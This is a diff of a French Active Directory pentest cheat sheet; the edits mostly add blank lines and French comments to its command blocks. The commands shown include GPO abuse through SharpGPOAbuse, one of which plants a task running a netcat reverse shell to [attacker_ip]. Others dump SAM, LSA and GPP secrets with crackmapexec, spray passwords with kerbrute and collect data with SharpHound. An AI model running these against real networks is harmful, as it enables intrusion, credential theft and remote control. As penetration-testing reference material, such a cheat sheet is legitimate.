@@ -1740,6 +1916,7 @@ Examiner les objets, les droits et les services du domaine.
 ```powershell
 powershell -ExecutionPolicy bypass
 Import-Module ./PowerView.ps1
+
 ```
 
 
@@ -1747,6 +1924,7 @@ Import-Module ./PowerView.ps1
 
 ```powershell
 Get-NetGPO | select displayname
+
 ```
 
 
@@ -1754,6 +1932,7 @@ Get-NetGPO | select displayname
 
 ```powershell
 Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner')} | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+
 ```
 
 
@@ -1765,18 +1944,23 @@ Get-DomainObjectAcl -LDAPFilter '(objectCategory=groupPolicyContainer)' | ? { ($
 
 ```text
 GPO control
+
 ```
 
 
 
 
 ```powershell
+# Examiner une stratégie de groupe
 Get-GPO -Name "[DisplayName]"
+
 ```
 
 
 ```powershell
+# Examiner une stratégie de groupe
 Get-GPO -Guid [gpo_id]
+
 ```
 
 
@@ -1784,6 +1968,7 @@ Get-GPO -Guid [gpo_id]
 
 ```powershell
 Get-GPPermission -Guid [gpo_id] -TargetType User -TargetName [user]
+
 ```
 
 
@@ -1795,6 +1980,7 @@ Get-GPPermission -Guid [gpo_id] -TargetType User -TargetName [user]
 
 ```powershell
 ./SharpGPOAbuse.exe --AddComputerTask --TaskName "test" --Author "[current_user]" --Command "cmd.exe" --Arguments "/c c:\path\to\nc.exe [attacker_ip] [port] -e cmd.exe" --GPOName "[GPO_to_abuse]"
+
 ```
 
 
@@ -1802,6 +1988,7 @@ Get-GPPermission -Guid [gpo_id] -TargetType User -TargetName [user]
 
 ```powershell
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <user> --GPOName "[GPO_to_abuse]"
+
 ```
 
 
@@ -1809,6 +1996,7 @@ Get-GPPermission -Guid [gpo_id] -TargetType User -TargetName [user]
 
 ```powershell
 gpupdate /force
+
 ```
 
 
@@ -1826,21 +2014,25 @@ Examiner les permissions et la configuration de Linux.
 
 ```bash
 enum4linux -U <DOMAIN_IP>
+
 ```
 
 
 ```bash
 enum4linux -a <DOMAIN_IP>
+
 ```
 
 
 ```bash
 enum4linux -u <VALID_USERNAME> -p <VALID_PASSWORD> <DOMAIN_IP>
+
 ```
 
 
 ```bash
 enum4linux -a <DOMAIN_IP> > domain_enum.txt
+
 ```
 
 
@@ -1851,26 +2043,35 @@ enum4linux -a <DOMAIN_IP> > domain_enum.txt
 
 ```bash
 crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --shares
+
 ```
 
 
 ```bash
+# Vérifier l'accès SMB
 crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --gpp-password
+
 ```
 
 
 ```bash
+# Examiner les données SAM accessibles
 crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> --sam
+
 ```
 
 
 ```bash
+# Examiner les secrets LSA accessibles
 crackmapexec smb <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> -d [domain].com --lsa
+
 ```
 
 
 ```bash
+# Lister les utilisateurs
 crackmapexec ldap <DOMAIN_IP> -u <VALID_USERNAME> -p <VALID_PASSWORD> -d [domain].com --users
+
 ```
 
 
@@ -1883,21 +2084,28 @@ Examiner les objets, les droits et les services du domaine.
 
 ```bash
 ldapsearch -x -h <DOMAIN_IP> -s base
+
 ```
 
 
 ```bash
+# Interroger l'annuaire LDAP
 ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName
+
 ```
 
 
 ```bash
+# Interroger l'annuaire LDAP
 ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local" "(objectClass=computer)" name
+
 ```
 
 
 ```bash
+# Interroger l'annuaire LDAP
 ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWORD> -b "DC=domain,DC=local"
+
 ```
 
 
@@ -1908,26 +2116,35 @@ ldapsearch -x -h <DOMAIN_IP> -D "<VALID_USERNAME>@[domain].com" -w <VALID_PASSWO
 
 ```bash
 rpcclient -U <VALID_USERNAME>%<VALID_PASSWORD> <DOMAIN_IP>
+
 ```
 
 
 ```bash
+# Lister les utilisateurs via RPC
 rpcclient $> enumdomusers
+
 ```
 
 
 ```bash
+# Interroger les informations RPC
 rpcclient $> enumdomgroups
+
 ```
 
 
 ```bash
+# Interroger les informations RPC
 rpcclient $> netshareenum
+
 ```
 
 
 ```bash
+# Interroger les informations RPC
 rpcclient $> querydominfo
+
 ```
 
 
@@ -1940,16 +2157,21 @@ Examiner les objets, les droits et les services du domaine.
 
 ```bash
 smbclient -L //<DOMAIN_IP> -U <VALID_USERNAME>%<VALID_PASSWORD>
+
 ```
 
 
 ```bash
+# Explorer les partages SMB
 smbclient //<DOMAIN_IP>/NETLOGON -U <VALID_USERNAME>%<VALID_PASSWORD>
+
 ```
 
 
 ```bash
+# Explorer les partages SMB
 smbclient //<DOMAIN_IP>/SYSVOL -U <VALID_USERNAME>%<VALID_PASSWORD> -c "get important_file.txt"
+
 ```
 
 
@@ -1965,7 +2187,9 @@ Examiner les objets, les droits et les services du domaine.
 
 
 ```bash
+# Collecter les relations Active Directory
 SharpHound.exe -c All -d [domain].com -u <VALID_USERNAME> -p <VALID_PASSWORD> -dc <DOMAIN_IP>
+
 ```
 
 
@@ -1978,6 +2202,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 nmap -p 88,135,139,389,445,636,3268,3389 -sC -sV -Pn <DOMAIN_IP>
+
 ```
 
 
@@ -1985,11 +2210,14 @@ nmap -p 88,135,139,389,445,636,3268,3389 -sC -sV -Pn <DOMAIN_IP>
 
 ```bash
 nmap --script smb-enum-shares,smb-enum-users -p445 <DOMAIN_IP>
+
 ```
 
 
 ```bash
+# Exécuter les scripts NSE sélectionnés
 nmap --script ldap-search -p389 <DOMAIN_IP>
+
 ```
 
 
@@ -2001,11 +2229,13 @@ nmap --script ldap-search -p389 <DOMAIN_IP>
 ```bash
 # A good wordlist of usernames is /usr/share/SecList/Usernames/xato-usernames-top-1millions-20000.txt
 kerbrute userenum --dc <DOMAIN_IP> -d [domain].com userlist.txt
+
 ```
 
 
 ```bash
 kerbrute passwordspray --dc <DOMAIN_IP> -d [domain].com userlist.txt <PASSWORD>
+
 ```
 
 
@@ -2018,11 +2248,14 @@ Observer les permissions et la configuration de Windows.
 
 ```powershell
 Get-ADUser -Filter * -Property * | Select-Object Name, SamAccountName, EmailAddress
+
 ```
 
 
 ```powershell
+# Énumérer les groupes Active Directory
 Get-ADGroup -Filter * | Select-Object Name, GroupScope
+
 ```
 
 
@@ -2033,6 +2266,7 @@ Get-ADGroup -Filter * | Select-Object Name, GroupScope
 
 ```bash
 nmap -p 445 --script smb-os-discovery <IP_RANGE>
+
 ```
 
 
@@ -2044,6 +2278,7 @@ nmap -p 445 --script smb-os-discovery <IP_RANGE>
 
 ```bash
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares --users
+
 ```
 
 
@@ -2055,6 +2290,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares --users
 
 ```bash
 smbclient //<DOMAIN_IP>/<SHARE> -U <USERNAME>
+
 ```
 
 
@@ -2075,6 +2311,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --users -d <DOMAIN_NAME
 
 # Énumérer les utilisateurs avec un hachage NTLM valide
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --users -d <DOMAIN_NAME>
+
 ```
 
 
@@ -2092,6 +2329,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --shares -d <DOMAIN_NAM
 
 # Lister les actions accessibles en utilisant un hachage NTLM
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --shares -d <DOMAIN_NAME>
+
 ```
 
 
@@ -2106,6 +2344,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --groups -d <DOMAIN_NAM
 
 # Avec hachage NTLM
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --groups -d <DOMAIN_NAME>
+
 ```
 
 
@@ -2117,6 +2356,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -H <NTLM_HASH> --groups -d <DOMAIN_NA
 ```bash
 # Vérifiez les politiques de mot de passe de domaine
 crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --pass-pol -d <DOMAIN_NAME>
+
 ```
 
 
@@ -2128,6 +2368,7 @@ crackmapexec smb <DOMAIN_IP> -u <USERNAME> -p <PASSWORD> --pass-pol -d <DOMAIN_N
 ```bash
 # Lister les utilisateurs et les parts sur une machine locale
 crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> --users --shares --local-auth
+
 ```
 
 
@@ -2144,6 +2385,7 @@ crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_
 
 # Dump domain groups
 crackmapexec ldap <DOMAIN_CONTROLLER_IP> -u <USERNAME> -p <PASSWORD> -d <DOMAIN_NAME> --groups
+
 ```
 
 
@@ -2160,6 +2402,7 @@ crackmapexec mssql <TARGET_IP> -u <USERNAME> -p <PASSWORD> --dbs
 
 # Exécuter les requêtes SQL
 crackmapexec mssql <TARGET_IP> -u <USERNAME> -p <PASSWORD> -q "SELECT name FROM master.dbo.sysdatabases"
+
 ```
 
 ---
